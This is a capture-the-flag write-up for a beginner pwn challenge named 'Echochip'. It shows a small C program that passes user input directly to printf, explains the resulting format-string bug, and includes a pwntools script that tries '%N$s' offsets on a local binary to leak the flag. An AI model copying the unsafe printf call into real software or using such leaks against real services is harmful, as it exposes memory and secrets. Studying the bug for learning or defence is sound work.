# Echochip

## Description

```
Soundboards are so 2076, get the new Kiroshi Echochip to add a cool echo, that will help establish your authority.
```

## Categories

- `pwn`

## Provided Files

- `Echochip.zip`

## Solve Process

While I did try to overthink this at first, I should have known that a beginner challenge couldn't be so complex after all. And it turns out it wasn't.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MIN(x, y) (x < y ? x : y)
char flag[0x100] = "dach2025{NOT_THE_FLAG}";

void setup(void) {
  char *flag_env = getenv("FLAG");
  if (flag_env == NULL)
    return;

  strncpy(flag, flag_env, sizeof(flag) - 1);
}

int main(int argc, char *argv[]) {
  char echo[0x200] = {0};
  char input[0x100] = {0};
  char *input_start, *echo_start;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setup();
  printf("Please input the message to echo: \n");
  fgets(input, sizeof(input), stdin);

  input_start = input;
  echo_start = echo;
  for (int i = 0; i < sizeof(input) && input[i] != 0; ++i) {
    if (input[i] == ' ' || input[i] == '\n') {
      int echo_len = MIN(3, &input[i] - input_start);
      memcpy(echo_start, input_start, &input[i] - input_start);
      echo_start += &input[i] - input_start;
      memcpy(echo_start, &input[i - echo_len], echo_len + 1);
      echo_start += echo_len + 1;
      input_start = &input[i + 1];
    }
  }

  printf(echo);
}
```

Although the algorithm for performing an "echo" might seem confusing at first, the important thing to note is the final `printf()` statement, which is passed the value of the `echo` variable directly without format specifiers. My editor [Zed]() even correctly reports this as an inline hint using `clang`:

> "clang: Format string is not a string literal (potentially insecure) (fix available)"

This should be a pretty simple to exploit printf format vulnerability, which allows us to leak values of the stack. Since the location is not known, we can try out a few different offsets using the format specifier `%x$s`, where `x` represents the offset and `%s` to output it in string format.

We can then brute-force our way to the flag using a simple solver script.

```py
from pwn import ELF, context

context.log_level = "critical"

elf = ELF("./Echochip")

for i in range(1,256):
    p = elf.process(env={"FLAG": "dach2025{test_flag}"})
    payload = b"".join(
        [
            b"%" + str(i).encode() + b"$s",
        ]
    )
    p.sendline(payload)
    output = p.recvall()
    if "dach" in output.decode("utf-8", errors="ignore"):
        print(payload)
        print(output.decode("utf-8", errors="ignore"))
        break
```

Don't overthink, just do, another flag.
